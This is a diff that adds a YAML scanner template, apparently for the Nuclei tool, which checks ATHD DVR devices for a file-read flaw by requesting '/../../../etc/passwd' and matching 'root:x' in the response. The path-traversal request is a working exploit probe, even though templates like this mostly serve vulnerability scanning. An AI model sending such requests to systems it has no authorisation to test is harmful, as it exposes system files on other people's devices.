@@ -1,0 +1,22 @@
+id: ATHD-DVR-fileRead
+
+info:
+  name: ATHD-DVR fileRead
+  author: Str1am    
+  severity: medium
+  tags: 53kf,file_read
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x"
+        part: body
+        condition: and
